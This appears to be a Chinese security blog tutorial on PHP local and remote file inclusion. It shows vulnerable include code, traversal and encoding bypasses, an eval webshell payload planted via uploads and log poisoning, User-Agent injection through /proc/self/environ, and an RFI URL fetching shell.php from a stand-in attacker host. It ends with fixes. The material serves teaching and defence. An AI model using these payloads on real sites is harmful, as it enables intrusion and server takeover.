# ****介绍****

文件包含漏洞属于代码注入漏洞，为了减少重复代码的编写，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码；简单来说就是一个文件里面包含另外一个或多个文件。

但我们除了包含常规的代码文件外，包含的任意后缀文件都会被当作代码执行，因此，如果有允许用户控制包含文件路径的点，那么则很有可能包含非预期文件，从而执行非预期的代码导致getshell。

几乎所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在PHP Web
Application中居多，在JSP、ASP中十分少甚至没有，问题在于语言设计的弊端。因此后续均以PHP为主。

#  ** **文件包含漏洞分类****

PHP中的文件包含分为 ** **本地文件包含**** 和 ** **远程文件包含**** 。

##  ** **LFI****

本地文件包含 Local File Include (LFI)

所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。

所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。

##  ** **RFI****

远程文件包含 Remote File Include (RFI)

如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。

远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。

  

#  ** **PHP的文件包含函数****

PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。

\- include：找不到被包含的文件时只会产生警告，脚本将继续执行。  
\- include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。  
\- require：找不到被包含的文件时会产生致命错误，并停止脚本。  
\- require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。

#  ** **漏洞示例代码****

 ** **<?php****  
// index.php  
$file = $_GET[ 'file' ];  
 ** **include**** $file  
 ** **? >****

快速启动一个简单的解析php的web server

php -S 127.0.0.1:9999

测试：

http://127.0.0.1:9999/index.php?file=/etc/passwd

![1646642663_6225c5e787879b4b381f8.png!small?1646642663922](https://image.3001.net/images/20220307/1646642663_6225c5e787879b4b381f8.png!small?1646642663922)

#  ** **利用**** ** **任意文件读取****

如果内容不符合php语法，就会直接返回文件内容，也就等于读取任意文件，和任意文件读取/下载一样，就不细说了，敏感文件路径可以参考我的另一篇文章：[任意文件下载/读取](https://mp.weixin.qq.com/s/XJFjYb5jRGtWS4ZYwPbv3A)

##  ** **使用PHP封装协议****

PHP带有很多内置URL风格的封装协议

###  ** **php://filter****

正常情况下，包含php文件会直接执行其中的代码，但如果我们想获取到php文件的源码，如config.php，那么我们可以通过封装协议php://filter来读取

http://127.0.0.1:9999/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png

![1646642681_6225c5f9486896db0dfa8.png!small?1646642681542](https://image.3001.net/images/20220307/1646642681_6225c5f9486896db0dfa8.png!small?1646642681542)

###  ** **php://input****

 ** **利用条件：**** 需要开启allow_url_include=on，对allow_url_fopen不做要求

![1646642692_6225c6042ea32395ad427.png!small?1646642692695](https://image.3001.net/images/20220307/1646642692_6225c6042ea32395ad427.png!small?1646642692695)

感觉利用起来都比较鸡肋，有需要可以参考：[浅谈文件包含漏洞](https://xz.aliyun.com/t/7176)

##  ** **RFI getshell****

如果支持远程文件包含，那么直接http://127.0.0.1:9999/index.php?file=http://evil.com/shell.php即可getshell，因为出现的情况实在是太少了，就不多说了。

##  ** **LFI+文件上传 getshell****

这是本地文件包含漏洞想要getshell的最容易想到的方法之一。

网站存在LFI漏洞，同时存在上传功能，如上传头像、证明信息等，那么我们可以上传一个包含恶意代码的任意后缀文件，如.png

其中.png的内容包含

<?php @eval($_GET['shell']);?>

利用如下：

http://127.0.0.1:9999/index.php?file=shell.png&shell=phpinfo();

![1646642706_6225c61279e25246dd642.png!small?1646642706779](https://image.3001.net/images/20220307/1646642706_6225c61279e25246dd642.png!small?1646642706779)

[!tip]

可能上传的文件中干扰因素过多，导致利用的展示界面很乱，那么我们可以通过file_put_contents()等函数单独再写一个webshell到其他文件中。

##  ** **LFI+日志文件 getshell****

日志文件往往会包含我们的请求记录，如果我们知道日志的文件位置，那么我们就可以将恶意的php代码写入到日志中，然后再通过文件包含漏洞就可以执行相关的代码。

 ** **举例：****

URL访问

http://127.0.0.1:9999/index.php?file=shell.png&test=<?php
@eval($_GET['shell']);?>

payload会被记录到日志文件中，此时日志文件如下

![1646642719_6225c61f29cafd4b578ee.png!small?1646642719478](https://image.3001.net/images/20220307/1646642719_6225c61f29cafd4b578ee.png!small?1646642719478)

我们只需要包含这个日志文件，那么就可以getshell

![1646642744_6225c6386b187f0189acb.png!small?1646642744704](https://image.3001.net/images/20220307/1646642744_6225c6386b187f0189acb.png!small?1646642744704)

 ** **日志默认路径:****

可能会有所出入，一切以实际情况为准

名

|

路径  
  
---|---  
  
tomcat

|

/usr/local/tomcat/logs/localhost_access_log.2020-09-21.txt  
  
apache+linux

|

/var/log/apache2/access.log  
/var/log/httpd/access.log  
/etc/httpd/logs/access.log  
  
nginx

|

/var/log/nginx/access.log  
/usr/local/nginx/logs/access.log  
  
##  ** **LFI+**** /proc/self/environ ** **getshell****

在linux中，如果php以cgi方式运行，那么/proc/self/environ中会包含请求头中的UA信息，也就可以getshell

GET lfi.php?file=../../../../../../proc/self/environ HTTP/1.1  
User-Agent: <?php phpinfo();?>

![1646642779_6225c65b2f9d00209e5aa.png!small?1646642779578](https://image.3001.net/images/20220307/1646642779_6225c65b2f9d00209e5aa.png!small?1646642779578)

可参考：[shell via LFI - proc/self/environ method](https://www.exploit-db.com/papers/12886)

##  ** **LFI+phpinfo getshell****

除了需要存在一个LFI漏洞外，还需要存在一个phpinfo()页面

原理：向phpinfo()页面POST上传一个文件，PHP就会将文件保存成一个临时文件，路径通常为：/tmp/php[6个随机字符],这个临时文件，在请求结束后就会被删除。有点类似于条件竞争的操作。

![1646642789_6225c6656c8d73bb4741c.png!small?1646642789933](https://image.3001.net/images/20220307/1646642789_6225c6656c8d73bb4741c.png!small?1646642789933)

利用工具：<https://github.com/diegoalbuquerque/LFI-phpinfo-RCE>

利用时需要修改工具中的参数和目标参数适配

##  ** **LFI+session getshell****

很鸡肋很鸡肋，要求你能控制session才行，一般我们可以先看下session中的内容哪些部分是可控的

php的session文件的保存路径可以在phpinfo的session.save_path看到。

![1646642799_6225c66f2d2491feca446.png!small?1646642799368](https://image.3001.net/images/20220307/1646642799_6225c66f2d2491feca446.png!small?1646642799368)

常见的php-session存放位置：

/var/lib/php/sess_PHPSESSID

/var/lib/php/sessions

/tmp/sess_PHPSESSID

/tmp/sessions/sess_PHPSESSID

如果可以控制session的内容，那么相当于可以控制文件/var/lib/php/sessions的内容，结合前面的操作就可以直接getshell了

#  ** **绕过**** ** **指定前缀****

 ** **漏洞代码：****

 ** **<?php****  
$file = $_GET['file'];  
 ** **include**** '/var/www/html/'.$file;  
 ** **? >****

 ** **绕过方法：****

通过../回溯符跳转到其他目录，如../../../proc/self/environ

还是通过回溯符../，主要是对内容进行编码

URL编码

2次URL编码

容器/服务器支持的编码，[..%c0%af](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)== ../，..%c1%9c == ..\

##  ** **指定后缀****

 ** **漏洞代码：****

 ** **<?php****  
$file = $_GET['file'];  
 ** **include**** $file.'/test/test.php';  
 ** **? >****

 ** **绕过方法：****

支持RFI的情况下，可以用?和#来绕过，?后面表示参数，#后面表示锚点，都不会影响到实际的URL

利用伪协议zip://和phar://，以zip为例，先创建一个压缩包，压缩目录为test/test/test.php，然后利用为zip://xxx.zip#test即可

php <
5.2.8的情况下，可以使用长度截断，只需要不断的重复./即可，linux下4096字节时会达到最大值，在window下是256字节，在达到最大值后，后面的部分将会被省略。如shell.php/./././././省略/./././；注意不能超过容器支持的最大长度，不然会提示GET请求太长。

php < 5.3.4且magic_quotes_gpc=off的情况下，存在00截断，和上传中的00截断类似，让后端误以为这是结束符

#  ** **修复建议****

过滤.（点）/（反斜杠）\（反斜杠）等特殊字符

尽量关闭allow_url_include配置

PHP 中使用 open_basedir 配置限制访问在指定的区域

对需要包含的文件设置文件白名单

#  ** **参考****

  * [文件包含漏洞](https://www.jianshu.com/p/7d665fb79d94)
  * [php文件包含漏洞Getshell的不同姿势](https://www.anquanke.com/post/id/248627)

